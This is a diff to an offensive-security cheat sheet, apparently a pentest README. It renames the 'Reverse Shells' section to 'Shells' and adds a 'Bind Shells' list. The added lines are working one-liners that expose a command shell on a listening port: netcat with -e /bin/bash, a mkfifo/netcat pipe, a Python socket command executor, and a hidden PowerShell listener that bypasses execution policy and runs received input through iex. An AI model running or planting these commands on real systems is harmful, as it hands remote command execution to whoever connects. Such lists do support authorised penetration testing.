@@ -10,7 +10,7 @@ Overview
 6. - [Brute Force](#6---brute-force)
 7. - [File Transfers](#7---file-transfers)
 8. - [Restricted Shell Escapes](#8---restricted-shell-escapes)
-9. - [Reverse Shells](#9---reverse-shells)
+9. - [Shells](#9---shells)
 10. - [Online Resources](#10---online-resources)
 11. - [Browser Plugins](#11---browser-plugins)
 12. - [Exploits](#12---exploits)
@@ -534,8 +534,18 @@ $ reset
 $ export TERM=xterm-256color
 ```
 
-#9. - Reverse Shells
+#9. - Shells
 -----------------------------------------
+
+- Bind Shells
+
+```
+$ nc -nlvp <port> -e /bin/bash
+$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+$ python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("<IP address>",<port>));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+$ powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
+
+```
 
 - Reverse Shells
 
